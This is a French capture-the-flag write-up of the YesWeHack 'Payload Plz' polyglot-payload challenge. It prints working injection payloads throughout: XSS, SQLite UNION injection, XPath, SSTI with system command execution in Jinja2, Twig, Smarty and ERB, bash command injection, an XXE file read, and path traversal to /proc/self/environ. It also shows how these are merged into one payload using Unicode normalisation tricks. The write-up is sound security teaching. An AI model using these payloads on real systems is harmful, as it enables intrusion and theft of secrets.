# Payload Plz - Analyse Du Challenge Yes We Hack


![Logo PayloadPlz](/img/payloadplz.png)

Du 27 au 29 Juin 2025 s'est tenu Le Hack, à la cité des sciences de Paris.
Pour l'occasion, des centaines de professionnels de la sécurité, d'étudiants ou de simples curieux, se sont réunis pour parler de Hacking, d'OSINT, et de sécurité.

Comme chaque année, de nombreuses entreprises, écoles, associations ou entités publiques étaient présentes. Notamment YesWeHack qui cette année a proposé un petit challenge pour le moins intéréssant et qui vaut la peine d'être décortiquer.

## One Payload to rule them all 

Le challenge, affectueusement nommé "[Payload Plz](https://payload-plz.com/)" (Ou comme nos amis Québécois diraient "Charge utile Svp"), a un principe simple :
Il y a 13 petits challenges en tout genre (SQLi, SSTI, XSS, ...) et nous devons en résoudre le plus possible avec 1 seule et même payload, et la plus courte possible.
Notre payload nous donnera un score calculé ainsi :
```
score = (nombre de challenges résolus × 1000) − taille de la payload
```

Le challenge n'a duré que 2 jours, en parallèle des conférences, accessibles à tous.

Je suis personnellement arrivé 10ème, avec une payload de 356 caractères permettant de résoudre 12 des 13 challenges.

L'objectif de ce blogpost sera donc de voir comment je suis arrivé à cette payload puis d'analyser celle de ceux arrivés plus haut dans le classement.

*Nota bene* : Les payloads que j'ai utilisé ne sont clairement pas les plus courtes, mais par soucis de transparence je les présenterais telles quelles.


## Les 13 challenges individuellement

La première étape, pour bien commencer, est de résoudre tous les challenges individuellement. Cela nous permettra d'avoir une base sur laquelle travailler notre payload.

À savoir par avance que tous les challenges sont "à l'aveugle". Nous n'aurons jamais la sortie, qu'il y ai une erreur ou non. Notre seule information étant si la paylaod a résolu le challenge, c'est à dire si le flag apparait dans la sortie.



### XSS 1

Pour ce challenge, il fallait déclencher un appel à `alert(flag)` par un bot chromium à jour.
Aucune protection n'était appliquée et notre payload était injectée dans le code suivant (à la place de `$INPUT`):
```HTML
<h1>Hello $INPUT</h1>
```

La manière la plus simple pour celle-ci étant de simplement ajouter une balise `<script>` contenant notre code javacript.
```HTML
<script>alert(flag)</script>
```

On test. Le challenge est résolu. On passe au suivant.

### XSS 2

Seconde XSS où l'objectif est le même : `alert(flag)`. Cependant le code est différent :
```HTML
<script>const x = '$INPUT'</script>
```

Ici, nous somme directement dans une balise script. Il faut sortir de la string, executer notre *alert* et terminer le code proprement.
Voici une solution :
```javascript
'; alert(flag)/*
```

Le commentaire à la fin de la payload permet d'ignorer totalement la *quote* et donc de rendre le code valide.

### SQL Injection 1

On change de type de vulnérabilité avec les injections SQL.
On nous fourni cette fois le schéma de base de données avec l'instruction de lire la colonne `flag` de la table `flag` :
```SQL
CREATE TABLE users (username TEXT, password TEXT, age INTEGER);
CREATE TABLE flag (flag TEXT);
```

Et encore une fois le code (enfin la requête) dans lequel nous devons injecter :
```SQL
SELECT * FROM users WHERE username = '$INPUT'
```

Nous avons cependant quelques informations en plus :
- La payload n'est toujours pas "nettoyée"
- La DBMS est SQLite3
- La payload est normalisée en NFKC

Mais pas besoin de savoir tout cela pour trouver une payload directement :
```SQL
' UNION SELECT 1,2,flag FROM flag;
```

Et on termine par un point virgule `;` afin de terminer la requête et d'éviter les erreurs, la quote d'après étant ignorée.

### SQL Injection 2

Globalement ce challenge est exactement le même que le précédent à une seule différence : notre input n'est pas entrée en *string* (Elle n'est pas entre *quotes*) :
```SQL
SELECT * FROM users WHERE age <$INPUT
```

Nous sommes ici aussi sur une solution relativement simple :
```SQL
1 UNION SELECT 1,2,flag FROM flag
```

Et cette fois, pas besoin de commentaire ou de point virgule, la requête sera valide telle quelle.

### XPath Injection

Pour ce challenge, un petit XML nous est présenté :
```XML
<db>
  <users>
    <user>
      <name>admin</name>
      <password>FLAG</password>
    </user>
    <user>
      <name>guest</name>
      <password>123456</password>
    </user>
  </users>
</db>
```

Un requête XPath est effectuée sur ce XML comme suit :
```XPath
//user[name/text()="guest" and password/text()="$INPUT"]/name/text()
```

Cette requête par défaut récupère le nom de l'utilisateur où `name = "guest"` et où `password = <NOTRE PAYLOAD>`.
Cependant, le flag se trouve dans le **mot de passe** de l'utilisateur *admin*... On ne peux pas se contenter d'ajouter des condition à la requête.
Notre objectif est donc de sortir de la *string*, puis de la requête initiale, et d'ajouter notre propre requête aux résultats afin d'aller récupérer le mot de passe.

Voici la payload que j'ai utilisé :
```xpath
"] | //user[ 1=1 ]/password/text() | //user[ 1="
```

On peut voir que l'on sort de la requête initiale `"]` que l'on rajoute une requête qui récupère tous les *password* `| //user[ 1=1 ]/password/text()` puis que l'on rend la requête valide `| //user[ 1="`

### Jinja SSTI 

Nous avons là un code python utilisa jinja2 sur notre payload :
```python
from jinja2 import Environment
import os

template = os.environ.get("PAYLOAD", "")
env = Environment()
tmpl = env.from_string(template)
print(tmpl.render())
```

Notre payload est apparemment interprétée telle quelle en jinja2.

L'objectif ici est de lire la variable d'environnement `FLAG`.
Le plus simple, à mon avis, étant d'accéder au module `os` afin d'accéder à `os.environ`.

```python
{{lipsum.__globals__.os.environ.FLAG}}
```

Petite explication : `lipsum` est un builtins de jinja2. En tant que builtins il a accès directement à `__globals__` où tous les modules importés sont présent.
Dans notre cas, `os` est importé dans le code fourni, mais il se trouve aussi dans le code importé de jinja2 `Environment`. Donc même sans cela nous pouvions y avoir accès.


### Brainfuck

Nous arrivons sur un challenge un peu moins "banal", qui a peut-être fait peur à beaucoup au premier abord.
L'objectif est de lire, en brainfuck (un langage ésothérique), le flag séparé en 2 partie.

La première partie est située à l'adresse 0, la seconde partie se trouve sur le stdin.

Si le brainfuck peut sembler peu simple d'accès il l'est moins pour nos amis les LLM comme Claude ou ChatGPT.
Et je ne dois pas me cacher, je leur ai demandé comment faire pour avoir à moins réfléchir (le soleil tape fort en ce moment et une surchauffe est vite arrivée).

Donc avant toute explication voici la payload :
```brainfuck
[.>],[.,]
```

Je vais d'abord expliquer les caractères :
- `.` : le point sert à afficher ce qui est à l'adresse actuelle (1 octet à la fois)
- `>` : le chevron sert à se déplacer d'adresse en adresse, dans notre cas à aller à l'adresse suivante
- `,` : la virgule lit la valeur de stdin et la stocke à l'adresse actuelle (1 octet à la fois)
- `[]` : les crochets permettent de faire une boucle jusqu'à ce que la valeur à notre adresse en sortie de boucle soit nulle ( `0` )

On commence donc par une première boucle `[.>]` qui va lire tous les caractères à partir de l'adresse actuelle (l'adresse 0), jusqu'à ce qu'une valeure nulle soit présente. Avec ça nous avons la première partie du flag.
Ensuite nous avons une première virgule `,` pour mettre le 1ère octet de stdin à notre adresse actuelle. Puis il faut l'afficher et récupérer la valeur suivante jusqu'à ce qu'on ai tout lu (donc jusqu'à une valeur nulle) : `[.>]`

Tout ça pour dire que le langage peut faire peur mais que l'exercice en lui même était plutôt simple.


### ERB SSTI

On a une seconde SSTI, ici en Ruby avec ERB.
Comme la précédente, il nous faut lire la variable d'environnement `FLAG` et on nous donne le code

```ruby
require 'erb'

PAYLOAD = ENV['PAYLOAD'] || 'Payload'

# Render and output
output = ERB.new(PAYLOAD).result(binding)
puts output
```

ERB intègre directement un moyen de lire les variables d'environnement, on va faire simple
```
<%= ENV['FLAG'] %>
```

### Twig SSTI

Encore une SSTI (et c'est pas fini !), cette fois basée en PHP avec Twig, et encore une fois il faut lire la variable d'environnement.

Voici le code :
```php
<?php
require __DIR__ . '/vendor/autoload.php';

use TwigLoaderArrayLoader;
use TwigEnvironment;

$PAYLOAD = getenv('PAYLOAD') ?: 'Payload';

$loader = new ArrayLoader(['index' => $PAYLOAD]);
$twig   = new Environment($loader, [
  'sandbox' => true,
]);

echo $twig->render('index', []);
```

Ici le code nous fait une petite farce. On peut voir `'sandbox' => true`.
Cependant, il s'agit juste d'une variable nommé `sandbox` qui est set à `true`, donc il n'y a aucune sandbox en place.
Donc, on va faire une payload simple pour twig.

Déjà, il n'est pas simple en pur twig d'aller lire une variable d'environnement précise. On va donc faire une attaque "simple" : une exécution de commande.
Celle-ci nous permettra d'exécuter la commande `env` qui va afficher toutes les variables d'environnement, dont `FLAG`.

```PHP
{{['env']|filter('system')}}
```

Super, ça fonctionne tout seul.

### Smarty SSTI 

Et la dernière SSTI !
Elle est en Smarty, donc aussi PHP.

On ne va pas tergiverser, voici le code :


```PHP
<?php
require __DIR__ . '/vendor/autoload.php';

$PAYLOAD = getenv('PAYLOAD') ?: 'Hello, World!';
$smarty = new Smarty();

echo $smarty->fetch('eval:' . $PAYLOAD);
```

Le code va juste executer notre payload, en twig, donc encore une fois il nous suffit d'avoir une payload simple.
Twig intègre les fonctions PHP de bases, donc `system`, on va encore une fois exécuter `env` directement.

```php
{system('env')}
```

Le challenge est passé !


### Bash

On sort encore une fois du web pour une injection de commande en bash.
Notre payload est injectée dans la commande suivante :
```bash
ping -c 1 '$INPUT'
```

Ici, le fait que la payload soit entre simple quote (`'`) nous empêche d'utiliser les substitutions de commandes `$()` ou `\`\``. Donc il faut sortir de la string et exécuter une nouvelle commande.
Il faut cependant faire attention à ce que la ligne de commande complète soit valide. Pour cela on peut rouvrir une quote, ou commenter la fin de la ligne. Je vais personnellement choisir la seconde option.

```bash
';env;#
```

Avec ça, pas d'erreur et une payload qui passe

### XXE

Pour le 12ème challenge on nous propose une vulnérabilité XXE.
Nous devons lire le fichier `/dev/shm/flag.txt` en profitant d'un parsing XML de notre payload.

Voici le code du challenge :
```python
from lxml import etree
import os

xml = os.environ.get("PAYLOAD", "")

parser = etree.XMLParser(
    load_dtd=True,
    no_network=True,
    resolve_entities=True,
    recover=True,
)
doc = etree.fromstring(xml.encode(), parser)
print(doc.text)
```

Et notre payload est uniquement préfixé d'une ligne :
```xml
<?xml version="1.0"?>
```

Donc notre payload constitue la quasi totalité du XML, sans avoir à sortir d'une balise ou échapper quoi que ce soit (quel bonheur).
```xml
<!DOCTYPE y [<!ENTITY x SYSTEM 'file:///dev/shm/flag.txt'>]><a>&x;</a>
```

La payload est la plus simple, et peut-être la plus connue, elle nous permet de définir un document `y` contenant une entité `x`. On assigne à cette entité une valeur externe, étant ici le fichier contenant le flag.
On défini ensuite un noeud dans lequel affiché notre entité, ici `<a>&x;</a>`

Une attaque connue et "simple" mais qui nous posera problème plus tard...


### Path Traversal

Pour finir la liste des challenges, nous avons une Path Traversal ! Celle-ci doit être effectuée à travers un code PHP :
```PHP
<?php

$PAYLOAD = getenv('PAYLOAD') ?: '';

print(file_get_contents($PAYLOAD));
```

Il nous faut afficher le contenu de la variable d'environnement `FLAG`.
De plus, si ça n'est pas visible dans le code, notre payload est préfixée par `./`.

Seulement, un problème se pose.
On doit lire une variable d'environnement, mais nous sommes clairement limité à la lecture de fichiers. Comment faire ?

On va utilisé les fichiers de processus !

Dans Linux, tout est fichier, il est donc normal que les processus soient soient représentés par des fichiers. Et les processus contiennent leurs variables d'environnement.
Pour accéder au processus courant, il faut aller dans le dossier `/proc/self/` contenant d'autre dossiers et fichiers. L'un d'eux est notre graal : `/proc/self/environ`

On se rend rapidement compte que nous ne sommes pas à la racine du serveur, mais il nous suffit de revenir en arrière avec `..` pour ensuite accéder à notre fichier

```
../proc/self/environ
```

Et nous avons résolu de manière indépendante les 13 challenges. Quel délivrance !


## Créer une payload commune

Maintenant que nous avons compris toutes les vulnérabilités, il nous faut "fusionner" les payloads.
Je ne pense pas qu'il y ai de méthodologie parfaite pour cela, mais je pense tout de même avoir fait comme la majorité des gens : on essaie de les imbriquer 1 par 1, puis on corrige ce qui créé des erreurs.

### Le début du commencement

Mon objectif étant de montrer ce que j'ai fait durant ce challenge, l'ordre des payloads ne sera pas forcément le plus intelligent. En effet, je n'avais pas forcément regardé tous les challenge individuellement lorsque j'ai commencé, j'étais surtout curieux.
Vous pourrez d'ailleurs voir que certaines payload vont changer au fur et à mesure. Une idée bonne lorsque l'on fait 5 vulnérabilités à la fois peut avoir des conséquences désastreuses pour implémenter la 12ème, et l'on devra alors tout retravailler.

Je suis parti du premier challenge que j'ai réussi : **l'injection bash**
Puis j'ai ajouté l'une des attaques que je connaissais le mieux pour aller petit à petit vers ce qui me semblait plus compliquer à implémenter.

### La SSTI Jinja2

Ma réflexion ici était la suivante :
Jinja n'interpretera pas du tout le bash, il est donc possible d'allier facilement l'un puis l'autre, notamment avec les 2 payloads que j'ai présenté plus tôt.

```
';env;#{{lipsum.__globals__.os.environ.FLAG}}
```

Ici aucune, entre autre grâce au commentaire.
On peut passer à l'étape suivante

### La 1ère Injection SQL

On continue avec ce que je connais le mieux et la première injection SQL.
On va profiter du fait que les 2 payloads (notre actuelle et celle de la SQLi) commencent par une simple quote.

```SQL
' UNION SELECT 1,2,flag FROM flag;env;#{{lipsum.__globals__.os.environ.FLAG}}
```

On sait déjà que ce qui se trouve après le premier point virgule ne posera pas de problème pour la SQLi, cependant, ce qui peut surprendre c'est le fait que le bash ne ressort pas une erreur.
En fait c'est dû au format de la commande injectée et à la syntaxe de la commande ping. Dans notre cas ping essaiera de résoudre le dernier "mot" de la commande, ici `flag` et puisqu'il n'y arrivera pas, il va créer une erreur.

```bash
$ ping -c 1 '' UNION SELECT 1,2,flag FROM flag
ping: flag: Name or service not known
```

La syntaxe est donc valide. Et l'erreur ne gêne pas pour la suite. L'utilisation de point virgule `;` permet d'enchaîner les commandes, avec ou sans erreur.


### Et la 2nde Injection SQL

Puisqu'on a fait une injection SQL, autant faire la suivante.
Ici, je vais profiter de la quote ajoutée pour la 1ère injection SQL. Je vais considérer toute ma payload actuelle comme une string et finir mon injection SQL ensuite.

```sql
' UNION SELECT 1,2,flag FROM flag--;env;#{{lipsum.__globals__.os.environ.FLAG}}' UNION SELECT 1,2,flag FROM flag
```

Cela fonctionne car on peut comparer 2 valeurs ayant un type différent en SQL, notamment INTEGER & TEXT.


### La Path Traversal

Si j'avais été plus intelligent, j'aurais du commencer par la **Path Traversal**.
En effet, dû à son fonctionnement, cette payload doit être à la toute fin, car il n'y a pas de moyen d'ignorer les caractères qui viendront après notre chemin de fichier.
Cela implique par contre qu'il y aura beaucoup caractère au début de notre paylaod de path traversal.
Heureusement pour nous, file_get_contents va normaliser/réduire le path. Si j'ai un chemin `/a/b/../c`, il sera réduit avant d'être lu et deviendra `/a/c` ne posant donc aucun problème, et ce même si le dossier `/a/b/` n'existe pas.

Pour notre path traversal, il suffira donc de rajouter un `/../` en plus et un autre pour chaque `/` contenu dans le reste de la payload. Vous verrez au fur et à mesure des payloads, l'ajout de `/../`.

Je vais juste prendre soin de commenter la fin de l'injection SQL pour éviter les erreurs.
```c
' UNION SELECT 1,2,flag FROM flag--;env;#{{lipsum.__globals__.os.environ.FLAG}}' UNION SELECT 1,2,flag FROM flag-- /../../proc/self/environ
```

### ERB

On profite pour l'instant de n'avoir aucune payload qui créé des erreurs avec une autre. Les SSTI de ERB vont bien dans ce sens avec leurs syntaxes qui ne provoquent pas d'erreur chez les autre SSTI.
Le tout étant de placer la payload au bon endroit : dans notre cas entre la 2ème SQLi et la path traversal.

```c
' UNION SELECT 1,2,flag FROM flag--;env;#{{lipsum.__globals__.os.environ.FLAG}}' UNION SELECT 1,2,flag FROM flag-- <%= ENV['FLAG'] %>/../../proc/self/environ
```

### Smarty 

Et voilà notre premier problème.
Smarty utilise 1 seule pair de brackets (`{}`) pour sa syntaxe, donc lorsqu'il croise la syntaxe de Jinja2 cela va provoquer une erreur.

Il nous faut trouver un moyen de ne pas interpréter Jinja2 lorsque nous somme en Smarty. Et pour ça on va utiliser un outil qu'on a déjà utilisé dans d'autre payloads : Les commentaires.

Smarty intègre les commentaires avec sa propre syntaxe `{* COMMENTAIRE *}`, en mettant la payload Jinja2 entre commentaire smarty, on peut donc se protéger. Puis on rajoute la payload smarty à côté de l'ERB.
```c
' UNION SELECT 1,2,flag FROM flag;env;#{*{{lipsum.__globals__.os.environ.FLAG}}*}' UNION SELECT 1,2,flag FROM flag-- {system('env')} <%= ENV['FLAG'] %>/../../proc/self/environ
```

### Twig

Encore une difficulté, encore à cause de Jinja2.
Twig et Jinja2 utilise une syntaxe similaire en quasi tout point (en tout cas pour notre challenge). On ne peut donc même pas utiliser l'astuce des commentaires.

Mon idée a alors été de profiter des propriété des langages (Jinja2 + Python & Twig + PHP). Voici les propriété qui m'ont semblé intéréssantes :
- PHP est sensible au type juggling a contrario de Python
- Jinja2 est sensibles aux erreurs (la moindre erreur fait planter tout l'affichage) alors que Twig, non
- Jinja2, comme python, n'interprète pas le code qu'il n'atteint pas. C'est à dire `{% if 1==2 %}{{ 1/0 }}{% endif %}` ne provoquera pas d'erreur, malgré la division par zéro, car il n'entrera jamais dans la condition.

Le tout est d'empêcher jinja2 d'interpéter le Twig plutôt que l'inverse. Il faut donc trouver une condition qui soit vraie en PHP mais fausse en Python et pour ça le type juggling va nous être utile.

La payload entre twig est Jinja2 va être la suivante :
```python
{% if '1'==1 %}{{['env']|filter('system')}}{% endif %}{{lipsum.__globals__.os.environ.FLAG}}
```

Super ça fonctionne entre les 2, cependant cela pose problème avec la 2ème SQLi.
En effet, j'ai rajouté des quote dans la payload juste avant la SQLi, et elle vont donc nous casser la payload SQL. Il faut donc déplacer cette payload Twig/Jinja avec les autre SSTI et penser à bien la remettre dans les commentaires Smarty.

```c
' UNION SELECT 1,2,flag FROM flag--;env;#' UNION SELECT 1,2,flag FROM flag-- {system('env')}{*{% if '1'==1 %}{{['env']|filter('system')}}{% endif %}{{lipsum.__globals__.os.environ.FLAG}}*} <%= ENV['FLAG'] %>/../../proc/self/environ
```

Parfait cela fonctionne bien !

### Xpath

Jusqu'ici je n'ai donc utilisé que des simples quotes, une aubaine pour notre Xpah qui est le seul challenge où les doubles quotes sont absolument nécessaires !
Et donc, il ne nous posera aucun problème de l'ajouter un peu où l'on veut. Dans mon cas je l'ajoute juste après les injections SQL, il est important que la payload vienne après la 2ème injection sinon les doubles quotes seront interprétées dans celle-ci.

```c
' UNION SELECT 1,2,flag FROM flag--;env;#' UNION SELECT 1,2,flag FROM flag-- "]|//user[1=1]/password/text()|//user[1="{system('env')}{*{% if '1'==1 %}{{['env']|filter('system')}}{% endif %}{{lipsum.__globals__.os.environ.FLAG}}*} <%= ENV['FLAG'] %>/../../../../../../proc/self/environ
```

Notre payload résoud un challenge de plus.

### Ajouter les XSS ?

À ce stade, j'ai déjà plus de la moitié des challenges qui passent et pourtant je n'ai pas intégré les 2 premiers : les XSS. Mais il y a une bonne raison à cela, c'est que ça m'a pris un peu de temps à trouver ce que je pouvait faire.

Dans un premier temps il faut trouver une payload qui fasse fonctionner les 2 XSS ensemble (pas très compliqué), mais ensuite il faut trouver comment les intégrer avec les SQLi, et ça, ça pose problème. Mais pour mieux montrer pourquoi, on va commencer par la 1ère étape.

#### D'une payload, deux XSS

Comme dit plus haut, l'assemblage des 2 XSS n'est pas des plus compliqués. On peut par exemple faire ceci 🎃
```javascript
';alert(flag)/*<script>alert(flag)</script>
```
Cependant cette payload utilise plusieurs `/` (donc + 6 caractères dans la Path Traversal). On va donc passer la 1ère XSS en 1 seule balise et inverser l'ordre.

```javascript
<img src=x onerror=alert(flag)>';alert(flag)/*
```

En espérant que cela ne me bloque pas

#### Les SQLi

Mince, me voilà bloqué !

Si je prend à part les 2 injections SQL j'ai ceci :
```sql
' UNION SELECT 1,2,flag FROM flag--' UNION SELECT 1,2,flag FROM flag
```

Si je rajoute la payload des XSS ensuite, j'aurais une erreur au niveau de la 2nde XSS, car j'aurais au final le code suivant :
```javascript
<script>const x = '' UNION SELECT 1,2,flag FROM flag--' UNION SELECT 1,2,flag FROM flag--';<img src=x onerror=alert(flag)>';alert(flag)/*'</script>
```

Et le code javascript n'étant pas valide, on aura une erreur. Et en inversant SQLi & XSS, c'est au niveau du SQL que l'erreur sera présente, notamment avec la 2nde SQLi.

```sql
SELECT * FROM users WHERE age <<img src=x onerror=alert(flag)>';alert(flag)/* UNION SELECT 1,2,flag FROM flag--' UNION SELECT 1,2,flag FROM flag--
```

La balise de la 1ère XSS va tout faire sauter.

Et de la 1ère SQLi 
```sql
SELECT * FROM users WHERE username = '<img src=x onerror=alert(flag)>';alert(flag)/*' UNION SELECT 1,2,flag FROM flag--' UNION SELECT 1,2,flag FROM flag--'
```

La quote nécessaire pour la 2nde XSS est interprétée par l'injection SQL. On peut essayer de faire un sandwich de XSS avec les SQLi de chaque part pour régler ce problème :
```sql
SELECT * FROM users WHERE username = '' UNION SELECT 1,2,flag FROM flag--<img src=x onerror=alert(flag)>';alert(flag)/*' UNION SELECT 1,2,flag FROM flag--


SELECT * FROM users WHERE age <' UNION SELECT 1,2,flag FROM flag--<img src=x onerror=alert(flag)>';alert(flag)/*' UNION SELECT 1,2,flag FROM flag--
```

Rien à faire, on aura forcément une erreur quelque part. Il nous manque forcément une pièce du puzzle.
Revenons à ce que j'ai écrit plus haut à propos des challenges SQL.

> Nous avons cependant quelques informations en plus :
> - La payload n'est toujours pas "nettoyée"
> - La DBMS est SQLite3
> - La payload est normalisée en NFKC

Que veux dire cette dernière ligne ?

#### Le NFKC

Généralement, lorsqu'une information nous est donnée dans un CTF/un challenge, c'est quelle est importante. Ici on nous parle de NFKC, qui est une Normalisation Unicode. Ces Normalisation servent à rendre un texte "standard" en évitant les homoglyphes (caractères qui se ressemblent visuellement mais sont en réalité différents).
.
Il transformera donc certains caractères unicodes en des caractères "standards".
Par exemple le caractère **①** deviendra tout simplement **1**.

Dans notre cas, cela peut nous permettre d'avoir des caractères qui seront interprétés par les payloads SQL mais pas par les autres. Et ce qui m'intérèsse le plus dans ce cas là, ce sont les quotes.
Je vais donc faire un petit programme python pour essayer d'en trouver

```python
import unicodedata

for i in range(1000000):
    if chr(i) not in "'\"":
        if unicodedata.normalize('NFKC',chr(i)) in "'\"":
            print(chr(i),i,">>>",unicodedata.normalize('NFKC',chr(i)))
```

J'obtiens 2 caractères : **＂** et **＇**.

#### XSS + SQLi

Grâce aux caractères obtenus je peux fermer la string de la SQLi sans que cela ferme celle de la XSS 2. La quote unicode ne sera en effet pas interprété par la XSS.

On peut faire comme suit :
```
＇ UNION SELECT 1,2,flag FROM flag--＇ UNION SELECT 1,2,flag FROM flag--;<img src=x onerror=alert(flag)>';alert(flag)/*
```

Avec les 2 premières quote étant en réalité des quote unicode, ce qui donnera pour la XSS 2

```javascript
<script>const x = '＇ UNION SELECT 1,2,flag FROM flag--＇ UNION SELECT 1,2,flag FROM flag--;<img src=x onerror=alert(flag)>';alert(flag)/*'</script>
```

Si la coloration syntaxique fonctionne bien, on peut voir que toute la partie SQL + 1ère XSS est dans la chaîne de caractère.

Il ne nous reste qu'à fusionner avec notre payload totale :

```c
＇ UNION SELECT 1,2,flag FROM flag--;env;# UNION SELECT 1,2,flag FROM flag--;<img src=x onerror=alert(flag)>';alert(flag)/* "]|//user[1=1]/password/text()|//user[1="{system('env')}{*{% if '1'==1 %}{{['env']|filter('system')}}{% endif %}{{lipsum.__globals__.os.environ.FLAG}}*} <%= ENV['FLAG'] %>/../../../../../../../proc/self/environ
```

### Le Brainfuck

À ce stade il ne me reste plus que 2 étapes : Le Brainfuck et la XXE. On commence par la payload la plus courte : Le Brainfuck.
Pour être sûr qu'il n'y ai aucun problème de syntaxe, mon idée est de mettre la payload brainfuck au tout début. En effet tant que le code du début est executé, la suite le sera aussi.

Comment mettre le brainfuck au tout début sans bloquer le SQL ? En abusant encore du NFKC.
On va utiliser les fausse double quote **＂** qui n'interfererons pas avec la 1ère SQLi, ouvrirons une string dans la 2nde et surtout ne bloquerons pas la xpath (qui ne les interpretera pas non plus).

```c
＂[.>],[.,]＇ UNION SELECT 1,2,flag FROM flag--;env;#＂ UNION SELECT 1,2,flag FROM flag--;<img src=x onerror=alert(flag)>';alert(flag)/* "]|//user[1=1]/password/text()|//user[1="{system('env')}{*{% if '1'==1 %}{{['env']|filter('system')}}{% endif %}{{lipsum.__globals__.os.environ.FLAG}}*} <%= ENV['FLAG'] %>/../../../../../../proc/self/environ
```

Petit problème cependant, la syntaxe est incorrecte. Certaines boucles ne sont pas fermée, d'autre fermées sans être ouverte. à ce stade la payload brainfuck, une fois nettoyée ressemble à ceci :

```brainfuck
[.>],[.,],,,,<>][][[]....<[]>....
```

On va donc chercher à corriger tout cela en ouvrant une bracket juste après notre brainfuck et en en fermant une autre juste après notre xpath, normalement cela devrait être réglé.

```c
＂[.>],[.,][＇ UNION SELECT 1,2,flag FROM flag--;env;#＂ UNION SELECT 1,2,flag FROM flag--;<img src=x onerror=alert(flag)>';alert(flag)/* "]|//user[1=1]/password/text()|//user[1="]{system('env')}{*{% if '1'==1 %}{{['env']|filter('system')}}{% endif %}{{lipsum.__globals__.os.environ.FLAG}}*} <%= ENV['FLAG'] %>/../../../../../../../proc/self/environ
```

Tout fonctionne, c'est super.

### La XXE

Hélas, je n'ai pas réussi dans le temps imparti à intégrer la XXE.
Pour que la XXE passe il fallait que dès le début la payload soit acceptée comme du XML recevable et donc commencer par une balise sans aucune quote. 

Si le `<<` peut passer sur la SQLi (un bitshift), je ne savais pas ce que je pouvais mettre après qui rendrais le tout valable.

Cependant, ma payload finale (n'étant pas celle que l'on a construit à tête reposée ensemble) était la suivante :

```c
＂[.>],[.,][＇ UNION SELECT 1,2,flag FROM flag-- ＇'/*;env;#;＂ UNION SELECT 1,2,flag FROM flag-- "]|//user[1=1]/password/text()|//user[1="]{system('env')}{*{% if '1'==1 %}{{['env']|filter('system')}}{% endif %}{{lipsum.__globals__.os.environ.FLAG}}*}<img src=x onerror=alert(flag)><%= ENV['FLAG'] %>*/;alert(flag);y='/../../../../../../../../proc/self/environ
```

On peut voir qu'elle est légèrement plus longue et laisse beaucoup de place à l'optimisation…
Mais est-ce que l'on peut voir ça ?

## La payload gagnante !

Je ne l'ai pas dit jusqu'ici mais le challenge a été remporté par **Ruulian** suivi de près (1 caractère) par **Mizu**. Et en plus de nous présenter le scoreboard, une fois le challenge terminé les payloads ont été rendues publiques.

Et voici la payload qui a gagné
```c
<?or 1
--[.>],[.</script>,"]|*?><!DOCTYPE x[<!ENTITY x SYSTEM "/dev/shm/flag.txt">]><svg onload="alert(flag)">&x;{system("env")}{*{{["env"]|map("system")and lipsum.__globals__.os.environ}}*}<%=`env`%>'
union select*,2,*from flag;env
/../../../../../../proc/self/environ
```

Je vais me pencher spécifiquement sur les différences afin de ne pas avoir trop d'informations (on en a déjà pas mal à ce niveau je pense). Et faisons cela dans l'ordre.

```sql
<?or 1
```
On commence par une ligne permettant de rendre valide la SQLi 2 mais aussi la XXE. En effet, le fait de commencer avec une balise peut rendre cela en XML syntaxiquement correct, et donc pas d'erreur, pendant que la SQLi nous fait un bitshift `<<` sur avec *NULL* car le `?` en SQLite donne cette valeure (je l'ignorais) et le `or 1` pour ensuite compléter la requête.



Ensuite on commence une nouvelle ligne :
```c
--[.>],[.</script>
```
Avec au début `--` afin de commenter pour la SQLi2, je ne vais pas spécialement rééxpliquer (du moins pas de suite) le code brainfuck, mais ensuite nous avons une balise fermant `</script>`.
L'objectif de cette balise est de ne plus s'embêter dans la XXS 2.


En effet, en dépit de la quote sur la XSS 2, la fermeture de balise sera bien interprétée. Par conséquent plus de problème de quote avec cette XSS.

```c
,"]|*?>
```

Cette partie permet 2 choses : Finir le code brainfuck, et exploiter la XPath. La double quote nous fera rentrer dans la payload XPath et le `|*` serait en quelque sort un `OR 1=1`. Pour rester honnête j'ai encore de la difficulté à comprendre pourquoi `?>` n'a pas déclenché d'erreur mais il semblerait que selon le parseur utilisé la requête soit bien interprétée puis la suite ignorée.
Et bien sûr le `?>` sert aussi à fermer la balise qui a été ouverte au tout début de la payload.

On retrouve ensuite la payload XXE + XSS
```c
<!DOCTYPE x[<!ENTITY x SYSTEM "/dev/shm/flag.txt">]><svg onload="alert(flag)">&x;
```

Ici nous somme sur quelque chose de particulièrement malin. Si on connait déjà la partie XXE, et il y a une légère différence pour la partie XSS.
Puisque nous avons fermé la balise script de la 2ème XSS, une seule et même balise peut nous suffir pour exploiter les 2 XSS. Ce que l'on fait avec la balise `svg` permettant une payload plus courte que la `img` que j'ai utilisée. Juste après on ajoute notre `&x` pour permettre l'execution de la XXE et c'est tout bon.

Passons le smarty qui est similaire à notre payload et voyons plutôt l'ensemble Jinja2 + Twig.
```python
{{["env"]|map("system")and lipsum.__globals__.os.environ}}
```

On voit une seule payload sans condition pour les 2 Moteurs de templates. Et c'est dû à l'utilisation du filtre `map` plutôt que `filter` (que j'ai utilisé).
En effet, ce filtre existe dans les 2 Moteurs et s'il affiche `env` au Twig il ne crééra qu'un objet `map` en Jinja2 mais sans erreur équivalent à True, le `and lipsum.__globals__.os.environ` étant donc ensuite intérprété en Jinja2 et affichant à son tour l'environnement.

On continue avec la payload ERB 
```c
<%=`env`%>'
```

L'utilisation des backticks ne pouvait pas fonctionner avec ma payload, celles-ci créant des erreurs dans d'autre challenges. Cependant ici on est sur une ligne SQL commentée avec un autre saut de ligne ensuite. La payload fonctionne bien sans erreur pour les autres. Et la simple quote ensuite pour fermer la string SQL de la 1ère SQLi. Oui, car si vous l'avez bien remarqué depuis le début uniquement des double quote ont été utilisée, justement pour cette SQLi.


La fin est ensuite assez simple à comprendre.
```c
union select*,2,*from flag;env
/../../../../../../proc/self/environ
```

Cet `union` sera interprété par les 2 SQLi, on utilise des `*` pour limiter le nombre d'espace et au bout on ajoute la commande `env` pour le bash. Et pour finir bien sûr la path traversal qui doit rester à la fin.

Et le brainfuck ?
Bien sûr il est valable avec une payload qui donne :
```brainfuck
<--[.>],[.<>,]><[<.>]><>[]...<>,,............
```

On commence par aller une adresse plus loin et on décrémente 2 fois sa valeur, elle ne vaut donc pas 0. La 1ère boucle va par conséquent l'afficher et afficher les valeurs aux octets suivant `[.>]` puis on va lire le STDIN avec un `<>` au milieu qui au final s'annule.




## Conclusion

